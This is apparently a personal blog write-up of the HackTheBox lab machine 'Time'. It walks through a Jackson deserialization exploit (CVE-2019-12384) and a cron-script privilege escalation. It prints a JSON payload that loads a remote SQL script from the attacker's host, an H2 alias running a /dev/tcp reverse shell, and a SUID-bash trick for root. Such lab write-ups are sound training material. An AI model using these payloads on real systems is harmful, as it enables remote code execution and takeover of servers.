---
layout: post
title: "Time - HackTheBox"
permalink: "/time-hackthebox"
color: rgb(0, 138, 212)
excerpt_separator: <!--more-->
author: ritiksahni
tags: [HackTheBox, Deserialization]
---

<center><img src="assets/img/posts/time-htb/time_header.png" alt="Machine Information"></center>
<br>


Time is a medium-rated machine on HackTheBox created by [egotisticalSW](https://twitter.com/egot1sticalSW) and [felamos](https://twitter.com/_felamos) which takes us through exploiting a Java Deserialization in a JSON validator web application and abusing a cronjob with a misconfigured file permission set to gain a root shell.

<!--more-->

# Contents <a name="top">
* [Port Scanning](#port-scanning)
* [HTTP (Port 80)](#http)   
    * [Deserialization in Jackson](#deserialization)
        * [Understanding the Exploit](#understanding-expl)
        * [Reverse Shell as pericles](#revshell)
* [Privilege Escalation](#privesc)

---

# Port Scanning <a name="port-scanning">

```
# Nmap 7.80 scan initiated Thu Mar 25 13:05:00 2021 as: nmap -sC -sT -sV -p22,80 -oA nmap/initial 10.10.10.214
Nmap scan report for 10.10.10.214
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 25 13:05:17 2021 -- 1 IP address (1 host up) scanned in 17.59 seconds
```

We can see that 2 ports are open:

**Port 22**: SSH (OpenSSH 8.2p1 Ubuntu)  
**Port 80**: HTTP (Apache httpd 2.4.41)  

---

# HTTP (Port 80) <a name="http">

Upon accessing http://10.10.10.214/ we can see a page that says "Online JSON Beautifier & Validator".

![Online JSON Beautifier & Validator](assets/img/posts/time-htb/http_home.png)

In the drop-down box, we can see the "beautify" and "validate" options. It indicates that the "validate" function is in the Beta stage.
If we use beautify mode, it works well and doesn't look like there's any bug there.  

**JSON Beautifier**:
<center><img src="assets/img/posts/time-htb/beautify.png"></center>

**JSON Validator**:

<center><img src="assets/img/posts/time-htb/validator.png"></center>

We can see that the JSON validator functionality isn't working, and we have the following error:

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

This is happening because the application expects a JSON array but we supplied a JSON object. This error gives us some important information, the application uses Jackson.

**What is Jackson?**

Jackson is an open-source JAVA library that offers JSON parsing and data processing for various types of data formats.

Refer to the GitHub repository of Jackson for more information: [https://github.com/FasterXML/jackson](https://github.com/FasterXML/jackson)

---

## Deserialization in Jackson <a name="deserialization">

After searching on the internet for a while about Jackson library, I found that the application could be vulnerable to deserialization attacks because of Jackson. The assigned CVE ID is CVE-2019-12384.

[https://nvd.nist.gov/vuln/detail/CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384)

According to NVD, the description of this CVE goes as follows:

> FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.

I found a public exploit of CVE-2019-12384 - [https://github.com/jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384) but before using it, let's understand the exploit.

### Understanding the exploit <a name="understanding-expl">

The exploit we are going to use is [https://github.com/jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384). CVE-2019-12384 is the CVE ID of a deserialization vulnerability in the Jackson library that is used for deserializing JSON data.


Jackson deserializes `ch.qos.logback.core.db.DriverManagerConnectionSource` and that class can be abused to **instantiate** a JDBC connection.

> In Java, instantiation is the creation of an instance of an object through a class.

JDBC stands for Java Database Connectivity which is a Java API to connect and execute database queries, we can abuse the class, we can communicate with the database very easily, and load our SQL file.

We can use JDBC drivers with the URL of our machine and get SSRF/RCE. Download the exploit, you'll see a file **test.rb**. That file can be used to test your exploitation locally.

<script src="http://gist-it.appspot.com/https://github.com/jas502n/CVE-2019-12384/blob/master/test.rb"></script>

It imports Jackson packages and configures it so you can run the exploit locally for exploiting server-side request forgery or remote code execution.

The file **CVE-2019-12384.sh** has the JSON we need to load our own hosted SQL file which will be executed by the database.

<script src="http://gist-it.appspot.com/https://github.com/jas502n/CVE-2019-12384/blob/master/CVE-2019-12384.sh"></script>

It creates a symlink of jruby binary inside /usr/local/bin for easy usage.

> JRuby is an open-source implementation of Ruby programming language for the Java Virtual Machine. It allows us to run ruby code within a Java Virtual Machine and interface with libraries written in either Java or Ruby.

We can test the exploit locally, we will supply a location of our listener just to see if it makes a connection or not.

![JDBC - SSRF (Locally)](assets/img/posts/time-htb/ssrf-jdbc.png)


```bash
jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://10.10.14.9:9000/ssrf/\"}]"
```

The file **test.rb** creates a vulnerable environment for us, we can confirm that our JSON exploit works!

Our goal is not just to establish TCP connections between the vulnerable machine and our machine but to gain code execution, for that we can load our SQL file by exploiting this SSRF and when that SQL file is executed by the H2 database, the system commands will be executed.

---

### Reverse Shell as pericles <a name="revshell">

We can use the following JSON object to load our SQL file and gain code execution

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://LHOST:LPORT/inject.sql'"}]"
```

We can see that we've specified `INIT=RUNSCRIPT` which will initiate a JDBC connection and load SQL file from our controlled host. The contents of inject.sql should be as follows.

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')
```

This creates an alias for code execution with our specified commands. You can specify any system command in the last line where **SHELLEXEC** is being called.

For more information on how this is working, refer to this blog: [https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html). It explains the concept of abusing the H2 database using an alias just the way we are doing in this box.


Place the SQL file in a directory and start your web server and a listener to start with remote exploitation.
Use the Validate feature in the vulnerable web application and put the JSON object with path to inject.sql and click on "Process".

![Reverse Shell - pericles](assets/img/posts/time-htb/pericles-shell.png)

## Privilege Escalation <a name="privesc">

Running [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it checked for files with `.sh` extension inside the PATH.

![.sh files in $PATH](assets/img/posts/time-htb/sh-filepath.png)

There is an odd file which is /usr/bin/timer_backup.sh, the contents of the file are as follows:


```bash
pericles@time:/dev/shm$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

The script is owned by us so we can read/write it. It creates a ZIP archive of all the directory /var/ww/html and moves it to /root/backup.zip.

There are 2 possibilities, first is that the root user is supposed to manually run the script whenever a backup is needed. Second, there is a cronjob running as root which automates the backup process and runs after a specific period.

As we own the script, we can change the contents and make the cronjob execute the code **we want**.

![Root Shell](assets/img/posts/time-htb/root-shell.png)

We added a line in /usr/bin/timer_backup.sh which would mark /bin/bash as a SETUID from root. As soon as the root cronjob was run, /bin/bash was marked as SUID binary and I just ran `/bin/bash -p` for a shell with root permissions. You can also try different methods of getting a shell e.g. adding a reverse shell script in /usr/bin/timer_backup.sh or reading SSH private key, etc.

**I hope you enjoyed the write-up and learned new stuff! Feel free to message me on my socials for feedback/suggestions. [Contact Me](/contact)**

Thank you for reading!

[Back to Top](#top)